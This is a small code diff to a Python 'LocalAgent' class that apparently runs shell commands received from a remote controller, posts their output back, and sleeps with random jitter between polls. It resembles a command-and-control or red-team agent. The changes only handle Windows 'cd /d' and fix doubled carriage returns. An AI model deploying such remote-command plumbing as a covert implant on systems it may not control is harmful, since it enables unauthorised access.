@@ -616,6 +616,8 @@ class LocalAgent:
 			return self.processForwardRemove(response)
 		elif response.startswith("cd "):
 			relative = response[len("cd "):]
+			if(relative.startswith("/d ")):
+				relative = relative[len("/d "):]
 			try:
 				os.chdir(os.path.join(os.path.abspath(os.getcwd()), relative))
 			except:
@@ -826,6 +828,7 @@ class LocalAgent:
 					cmd_output += cmd_obj.stderr.read().decode("utf-8") 
 					if self.newLineAfterCmdOutput:
 						cmd_output = cmd_output + "\n"
+					cmd_output = cmd_output.replace("\r\r", "\r") #Python for reasons unknown adds an extra \r to native windows executable outputs
 					self.postResponse(cmd_output)
 				else:
 					sleep_int = 1 + (random.randint(1,500) / 1000)
